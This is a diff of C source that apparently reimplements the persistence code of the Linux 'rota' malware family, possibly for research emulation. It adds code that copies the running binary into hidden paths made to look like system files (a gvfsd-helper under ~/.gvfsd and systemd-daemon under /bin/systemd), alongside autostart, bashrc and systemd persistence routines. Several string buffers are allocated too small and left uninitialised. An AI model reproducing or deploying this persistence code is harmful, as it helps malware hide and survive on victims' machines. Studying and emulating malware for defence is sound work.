@@ -92,24 +92,70 @@ bool nonroot_desktop_persistence() {
     // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     bool result = write_to_file(fpath, gnomehelper_desktop);
 
+    // -------- copy userland binry now -------------
+    //
+    // copy rota binary
+    // TODO convert gvfsd_helper into char array
+    // TODO decrypt and rotate char array below
+    char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
+    fpath_size = strlen(HOME) + strlen(gvfsd_helper);
+    char *binpath = (char *)malloc(fpath_size);
+
+    strncat(binpath, HOME, strlen(HOME));
+    strncat(binpath, gvfsd_helper, strlen(gvfsd_helper));
+
+    // build string for userland file location.
+    //char *gvfsd_profile= "/.gvfsd/.profile";
+    char *gvfsd_profile= "/.gvfsd";
+    dirpath_size = strlen(HOME) + strlen(gvfsd_profile);
+    char *dirpath_profile = (char *)malloc(dirpath_size);
+    strncat(dirpath_profile, HOME, strlen(HOME));
+    strncat(dirpath_profile, gvfsd_profile, strlen(gvfsd_profile));
+    // if directory does not exist create it.
+    if (access(dirpath_profile, F_OK) == -1) {
+        int res = mkdir(dirpath_profile, 0755);
+        if (res != 0) {
+            fprintf(stderr, "\nError creating directory to %s\nnerror: %s",
+                dirpath_profile, strerror(errno));
+        }
+
+    }
+
+    // creaking .profile within gvfsd
+    char *profile_dir = "/.gvfsd/.profile";
+    dirpath_size = strlen(HOME) + strlen(profile_dir);
+    char *profilepath_profile = (char *)malloc(dirpath_size);
+    strncat(profilepath_profile, HOME, strlen(HOME));
+    strncat(profilepath_profile, profile_dir, strlen(profile_dir));
+    // if directory does not exist create it.
+    if (access(profilepath_profile, F_OK) == -1) {
+        int res = mkdir(profilepath_profile, 0755);
+        if (res != 0) {
+            fprintf(stderr, "\nError creating directory to %s\nnerror: %s",
+                dirpath_profile, strerror(errno));
+        }
+    }
+
+    // write rota binary to persistence location.
+    bool rota_write = copy_rota_to_userland(binpath);
+
+    if (rota_write == false) {
+        fprintf(stderr, "\nError writing rota to %s:\nerror : %s",
+                binpath, strerror(errno));
+    }
+
+
     free(fpath);
+    free(binpath);
     return result;
-
 }
-
-
-bool copy_rota_to_userland() {
-    //TODO copy rota to designated locations.
-
-    return true;
-}
-
 
 bool nonroot_persistence(void) {
+    // handy wraper funtion for non-root persistence.
+    // note - this is not 1:1 with how the analyzed samples call persistence methods.
 
     nonroot_desktop_persistence();
     nonroot_bashrc_persistence();
-    copy_rota_to_userland(); // copy to hardcoded locations on disk.
     return true;
 }
 
@@ -143,6 +189,7 @@ bool root_persistence(void) {
         int fpath_size = strlen(systemd_path_1);
         fpath = (char *)malloc(fpath_size);
         result = write_to_file(fpath, systemd_agent_conf);
+        copy_rota_to_userland("/bin/systemd/systemd-daemon");
 
     } else { // non systemd system...
         /**
@@ -164,6 +211,7 @@ bool root_persistence(void) {
         int fpath_size = strlen(init_path_1);
         fpath = (char *)malloc(fpath_size);
         result = write_to_file(fpath, sys_temd_agent_service);
+        copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
     }
 
     free(fpath);
@@ -191,4 +239,31 @@ bool monitor_proc(int pid) {
     } else {
         return false; // file does not exists, respawn program
     }
+}
+
+bool copy_rota_to_userland(char *destpath) {
+    struct stat procstru;
+    int fsize;
+
+    // allocating file size to copy data to destination buffer.
+    stat("/proc/self/exe", &procstru);
+    fsize = procstru.st_size;
+    char *exe = (char *)malloc(fsize);
+
+    // copy data from /proc/self/exe into exe buffer.
+    int fd  = open("/proc/self/exe", O_RDONLY);
+    read(fd, exe, fsize);
+    close(fd);
+
+    // write binary to new location specified by destpath
+    int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
+    int bytesWritten = write(fout, exe, fsize);
+    free(exe);
+
+    // if bytes written == size of file
+    if (bytesWritten == fsize) {
+        return true;
+    }
+
+    return false;
 }
